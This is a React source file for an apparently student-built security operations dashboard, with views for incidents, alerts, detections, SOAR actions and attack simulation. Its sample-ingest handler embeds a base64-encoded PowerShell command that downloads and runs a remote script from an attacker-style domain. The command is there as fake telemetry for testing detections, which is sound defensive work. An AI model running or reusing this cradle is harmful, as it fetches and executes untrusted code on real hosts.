import React, { useState, useEffect, useCallback } from 'react';
import { Sidebar, type NavSection } from './components/layout/Sidebar';
import { Header } from './components/layout/Header';
import { SOCDashboard } from './components/dashboard/SOCDashboard';
import { IncidentsHub } from './components/incidents/IncidentsHub';
import { AlertsQueue } from './components/alerts/AlertsQueue';
import { ThreatHunting } from './components/hunting/ThreatHunting';
import { DetectionStudio } from './components/detections/DetectionStudio';
import { AIAnalystWorkspace } from './components/ai_analyst/AIAnalystWorkspace';
import { AttackGraphView } from './components/attack_graph/AttackGraphView';
import { IdentityThreatView } from './components/identity/IdentityThreatView';
import { MitreMatrixView } from './components/mitre/MitreMatrixView';
import { ThreatIntelView } from './components/threat_intel/ThreatIntelView';
import { MachineLearningView } from './components/ml/MachineLearningView';
import { SOARPlaybooksView } from './components/soar/SOARPlaybooksView';
import { AttackSimulationLab } from './components/simulation/AttackSimulationLab';
import { AuditLogsView } from './components/audit/AuditLogsView';
import { ResearchEvaluationView } from './components/research/ResearchEvaluationView';
import { ReportingView } from './components/reports/ReportingView';
import { CollectorsView } from './components/collectors/CollectorsView';

import type {
  AegisEvent,
  CollectorConfig,
  DetectionRule,
  Alert,
  Incident,
  ThreatIntelIOC,
  MLModelEvaluationMetrics,
  IdentityProfile,
  SOARAction,
  AttackSimulationScenario,
  SimulationExecution,
  AuditLogEntry,
  FYPResearchMetrics,
  AttackGraphNode,
  AttackGraphEdge
} from './types/soc';

export default function App() {
  const [currentSection, setCurrentSection] = useState<NavSection>('dashboard');
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);

  // Core Data States
  const [events, setEvents] = useState<AegisEvent[]>([]);
  const [collectors, setCollectors] = useState<CollectorConfig[]>([]);
  const [rules, setRules] = useState<DetectionRule[]>([]);
  const [alerts, setAlerts] = useState<Alert[]>([]);
  const [incidents, setIncidents] = useState<Incident[]>([]);
  const [identityProfiles, setIdentityProfiles] = useState<IdentityProfile[]>([]);
  const [threatIntelIOCs, setThreatIntelIOCs] = useState<ThreatIntelIOC[]>([]);
  const [mitreTactics, setMitreTactics] = useState<any[]>([]);
  const [mlMetrics, setMlMetrics] = useState<MLModelEvaluationMetrics | null>(null);
  const [soarActions, setSoarActions] = useState<SOARAction[]>([]);
  const [scenarios, setScenarios] = useState<AttackSimulationScenario[]>([]);
  const [executions, setExecutions] = useState<SimulationExecution[]>([]);
  const [auditLogs, setAuditLogs] = useState<AuditLogEntry[]>([]);
  const [researchMetrics, setResearchMetrics] = useState<Record<string, FYPResearchMetrics>>({});
  const [attackGraph, setAttackGraph] = useState<{ nodes: AttackGraphNode[]; edges: AttackGraphEdge[] }>({
    nodes: [],
    edges: []
  });

  const [selectedIncidentId, setSelectedIncidentId] = useState<string>('INC-2026-001');

  // Load all data from API
  const loadAllData = useCallback(async () => {
    setIsRefreshing(true);
    try {
      const [
        eventsRes,
        collectorsRes,
        rulesRes,
        alertsRes,
        incidentsRes,
        identityRes,
        tiRes,
        mitreRes,
        mlRes,
        soarRes,
        simRes,
        auditRes,
        researchRes
      ] = await Promise.all([
        fetch('/api/events?limit=100').then(r => r.json()),
        fetch('/api/telemetry/collectors').then(r => r.json()),
        fetch('/api/detections/rules').then(r => r.json()),
        fetch('/api/alerts').then(r => r.json()),
        fetch('/api/incidents').then(r => r.json()),
        fetch('/api/identity/profiles').then(r => r.json()),
        fetch('/api/threat-intel/iocs').then(r => r.json()),
        fetch('/api/mitre/coverage').then(r => r.json()),
        fetch('/api/ml/metrics').then(r => r.json()),
        fetch('/api/soar/actions').then(r => r.json()),
        fetch('/api/simulation/scenarios').then(r => r.json()),
        fetch('/api/audit/logs').then(r => r.json()),
        fetch('/api/research/metrics').then(r => r.json())
      ]);

      if (eventsRes.events) setEvents(eventsRes.events);
      if (collectorsRes.collectors) setCollectors(collectorsRes.collectors);
      if (rulesRes.rules) setRules(rulesRes.rules);
      if (alertsRes.alerts) setAlerts(alertsRes.alerts);
      if (incidentsRes.incidents) setIncidents(incidentsRes.incidents);
      if (identityRes.profiles) setIdentityProfiles(identityRes.profiles);
      if (tiRes.iocs) setThreatIntelIOCs(tiRes.iocs);
      if (mitreRes.tactics) setMitreTactics(mitreRes.tactics);
      if (mlRes.metrics) setMlMetrics(mlRes.metrics);
      if (soarRes.actions) setSoarActions(soarRes.actions);
      if (simRes.scenarios) setScenarios(simRes.scenarios);
      if (simRes.active_executions) setExecutions(simRes.active_executions);
      if (auditRes.logs) setAuditLogs(auditRes.logs);
      if (researchRes.metrics) setResearchMetrics(researchRes.metrics);

      // Load graph for selected incident
      const graphRes = await fetch(`/api/incidents/${selectedIncidentId}/graph`).then(r => r.json());
      if (graphRes.nodes && graphRes.edges) {
        setAttackGraph(graphRes);
      }
    } catch (err) {
      console.error('Error fetching SOC telemetry state:', err);
    } finally {
      setIsRefreshing(false);
    }
  }, [selectedIncidentId]);

  useEffect(() => {
    loadAllData();
  }, [loadAllData]);

  // Connect to Live Telemetry SSE stream
  useEffect(() => {
    let eventSource: EventSource | null = null;
    try {
      eventSource = new EventSource('/api/telemetry/stream');
      eventSource.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data.type === 'TELEMETRY_INGEST' || data.type === 'LIVE_EVENT' || data.type === 'FILE_INGEST') {
            if (data.event) {
              setEvents(prev => [data.event, ...prev.slice(0, 199)]);
            }
            if (data.events && Array.isArray(data.events)) {
              setEvents(prev => [...data.events, ...prev].slice(0, 200));
            }
            if (data.alerts && Array.isArray(data.alerts) && data.alerts.length > 0) {
              setAlerts(prev => [...data.alerts, ...prev].slice(0, 100));
            }
          }
        } catch (e) {
          console.error('Failed to parse SSE live telemetry payload', e);
        }
      };
    } catch (e) {
      console.warn('SSE subscription failed or unsupported', e);
    }
    return () => {
      eventSource?.close();
    };
  }, []);

  // Handler for AI SOC Investigation
  const handleTriggerAIInvestigation = async (incidentId: string) => {
    setIsAnalyzing(true);
    try {
      const res = await fetch('/api/ai/investigate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ incident_id: incidentId })
      });
      const data = await res.json();
      if (data.analysis) {
        setIncidents(prev => prev.map(inc => inc.incident_id === incidentId ? { ...inc, ai_analysis: data.analysis } : inc));
      }
    } catch (err) {
      console.error('Failed to trigger AI investigation:', err);
    } finally {
      setIsAnalyzing(false);
    }
  };

  // Handler for SOAR approval
  const handleApproveSOARAction = async (actionId: string) => {
    try {
      const res = await fetch('/api/soar/approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action_id: actionId, operator: 'lead.analyst@aegissoc.internal' })
      });
      const data = await res.json();
      if (data.action) {
        setSoarActions(prev => prev.map(a => a.action_id === actionId ? data.action : a));
        loadAllData();
      }
    } catch (err) {
      console.error('Failed to approve SOAR action:', err);
    }
  };

  // Handler for SOAR rollback
  const handleRollbackSOARAction = async (actionId: string) => {
    try {
      const res = await fetch('/api/soar/rollback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action_id: actionId, operator: 'lead.analyst@aegissoc.internal' })
      });
      const data = await res.json();
      if (data.action) {
        setSoarActions(prev => prev.map(a => a.action_id === actionId ? data.action : a));
        loadAllData();
      }
    } catch (err) {
      console.error('Failed to rollback SOAR action:', err);
    }
  };

  // Handler for rule toggle
  const handleToggleRule = async (ruleId: string) => {
    try {
      const res = await fetch(`/api/detections/rules/${ruleId}/toggle`, { method: 'POST' });
      const data = await res.json();
      if (data.rule) {
        setRules(prev => prev.map(r => r.id === ruleId ? data.rule : r));
      }
    } catch (err) {
      console.error('Failed to toggle detection rule:', err);
    }
  };

  // Handler for saving rule
  const handleSaveRule = async (rule: DetectionRule) => {
    try {
      const res = await fetch('/api/detections/rules', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(rule)
      });
      const data = await res.json();
      if (data.rule) {
        setRules(prev => {
          const idx = prev.findIndex(r => r.id === rule.id);
          if (idx >= 0) {
            const next = [...prev];
            next[idx] = data.rule;
            return next;
          }
          return [data.rule, ...prev];
        });
      }
    } catch (err) {
      console.error('Failed to save detection rule:', err);
    }
  };

  // Handler for alert status change
  const handleUpdateAlertStatus = async (alertId: string, status: Alert['status']) => {
    try {
      const res = await fetch(`/api/alerts/${alertId}/status`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status })
      });
      const data = await res.json();
      if (data.alert) {
        setAlerts(prev => prev.map(a => a.alert_id === alertId ? data.alert : a));
      }
    } catch (err) {
      console.error('Failed to update alert status:', err);
    }
  };

  // Handler for attack simulation run
  const handleExecuteSimulation = async (scenarioId: string, host: string) => {
    try {
      const res = await fetch('/api/simulation/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ scenario_id: scenarioId, target_host: host, operator: 'researcher_lead@lab.internal' })
      });
      const data = await res.json();
      if (data.execution) {
        setExecutions(prev => [data.execution, ...prev]);
        loadAllData();
      }
    } catch (err) {
      console.error('Failed to execute attack scenario:', err);
    }
  };

  // Handler for sensor toggle
  const handleToggleCollector = async (collectorId: string) => {
    try {
      const res = await fetch(`/api/telemetry/collectors/${collectorId}/toggle`, { method: 'POST' });
      const data = await res.json();
      if (data.collector) {
        setCollectors(prev => prev.map(c => c.id === collectorId ? data.collector : c));
      }
    } catch (err) {
      console.error('Failed to toggle collector:', err);
    }
  };

  // Ingest sample batch simulator
  const handleInjectSampleBatch = async () => {
    const sample = [
      {
        event_id: `evt-${Date.now()}-sample`,
        timestamp: new Date().toISOString(),
        source: 'windows_sysmon',
        event_type: 'process_creation',
        host_id: 'host-ws-03',
        hostname: 'WS-FINANCE-03',
        username: 'j.doe',
        source_ip: '192.168.10.45',
        destination_ip: '192.168.10.45',
        process_name: 'powershell.exe',
        process_id: 14210,
        command_line: 'powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAtAGEAdQB0AGgALQB0AGUAbABlAG0AZQB0AHIAeQAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==',
        severity: 'HIGH'
      }
    ];

    try {
      await fetch('/api/telemetry/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sample)
      });
      loadAllData();
    } catch (err) {
      console.error('Failed to ingest sample batch:', err);
    }
  };

  // Threat Hunting Search
  const handleHuntingSearch = async (query: string, source: string, severity: string) => {
    try {
      const params = new URLSearchParams();
      if (query) params.append('q', query);
      if (source) params.append('source', source);
      if (severity) params.append('severity', severity);
      params.append('limit', '100');

      const res = await fetch(`/api/events?${params.toString()}`);
      const data = await res.json();
      if (data.events) {
        setEvents(data.events);
      }
    } catch (err) {
      console.error('Failed to query events in Threat Hunting:', err);
    }
  };

  const openIncidentCount = incidents.filter(i => i.status !== 'CLOSED').length;
  const criticalAlertCount = alerts.filter(a => a.severity === 'CRITICAL').length;

  return (
    <div className="flex h-screen bg-neutral-950 text-neutral-100 font-sans antialiased overflow-hidden">
      {/* Primary Sidebar */}
      <Sidebar
        currentSection={currentSection}
        onSelectSection={setCurrentSection}
        openIncidentCount={openIncidentCount}
        criticalAlertCount={criticalAlertCount}
      />

      {/* Main Screen Content Area */}
      <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
        {/* Top Header Bar */}
        <Header
          currentSectionTitle={currentSection.replace('_', ' ')}
          onRefresh={loadAllData}
          isRefreshing={isRefreshing}
          onNavigateToLiveIngest={() => setCurrentSection('collectors')}
        />

        {/* Dynamic Route View Component */}
        <main className="flex-1 overflow-hidden relative">
          {currentSection === 'dashboard' && (
            <SOCDashboard
              events={events}
              alerts={alerts}
              incidents={incidents}
              collectors={collectors}
              onSelectIncident={(id) => {
                setSelectedIncidentId(id);
                setCurrentSection('incidents');
              }}
              onNavigateSection={(sec) => setCurrentSection(sec as NavSection)}
            />
          )}

          {currentSection === 'incidents' && (
            <IncidentsHub
              incidents={incidents}
              selectedIncidentId={selectedIncidentId}
              onSelectIncident={setSelectedIncidentId}
              onInvestigateWithAI={(id) => {
                setSelectedIncidentId(id);
                setCurrentSection('ai_analyst');
              }}
              onOpenAttackGraph={(id) => {
                setSelectedIncidentId(id);
                setCurrentSection('attack_graph');
              }}
              onApproveSOARAction={handleApproveSOARAction}
            />
          )}

          {currentSection === 'alerts' && (
            <AlertsQueue
              alerts={alerts}
              onUpdateAlertStatus={handleUpdateAlertStatus}
              onSelectIncident={(id) => {
                setSelectedIncidentId(id);
                setCurrentSection('incidents');
              }}
            />
          )}

          {currentSection === 'hunting' && (
            <ThreatHunting
              events={events}
              onSearch={handleHuntingSearch}
            />
          )}

          {currentSection === 'detections' && (
            <DetectionStudio
              rules={rules}
              events={events}
              onToggleRule={handleToggleRule}
              onSaveRule={handleSaveRule}
            />
          )}

          {currentSection === 'ai_analyst' && (
            <AIAnalystWorkspace
              incidents={incidents}
              activeIncidentId={selectedIncidentId}
              onSelectIncident={setSelectedIncidentId}
              onTriggerInvestigation={handleTriggerAIInvestigation}
              isAnalyzing={isAnalyzing}
            />
          )}

          {currentSection === 'attack_graph' && (
            <AttackGraphView
              incidentId={selectedIncidentId}
              nodes={attackGraph.nodes}
              edges={attackGraph.edges}
            />
          )}

          {currentSection === 'identity' && (
            <IdentityThreatView
              profiles={identityProfiles}
            />
          )}

          {currentSection === 'mitre' && (
            <MitreMatrixView
              tactics={mitreTactics}
            />
          )}

          {currentSection === 'threat_intel' && (
            <ThreatIntelView
              iocs={threatIntelIOCs}
            />
          )}

          {currentSection === 'ml' && mlMetrics && (
            <MachineLearningView
              metrics={mlMetrics}
            />
          )}

          {currentSection === 'soar' && (
            <SOARPlaybooksView
              actions={soarActions}
              onApproveAction={handleApproveSOARAction}
              onRollbackAction={handleRollbackSOARAction}
            />
          )}

          {currentSection === 'simulation' && (
            <AttackSimulationLab
              scenarios={scenarios}
              executions={executions}
              onExecuteScenario={handleExecuteSimulation}
            />
          )}

          {currentSection === 'collectors' && (
            <CollectorsView
              collectors={collectors}
              onToggleCollector={handleToggleCollector}
              onInjectTestBatch={handleInjectSampleBatch}
              onRefreshData={loadAllData}
            />
          )}

          {currentSection === 'audit' && (
            <AuditLogsView
              logs={auditLogs}
            />
          )}

          {currentSection === 'research' && (
            <ResearchEvaluationView
              metrics={researchMetrics}
            />
          )}

          {currentSection === 'reports' && (
            <ReportingView
              incidents={incidents}
              alerts={alerts}
            />
          )}
        </main>
      </div>
    </div>
  );
}
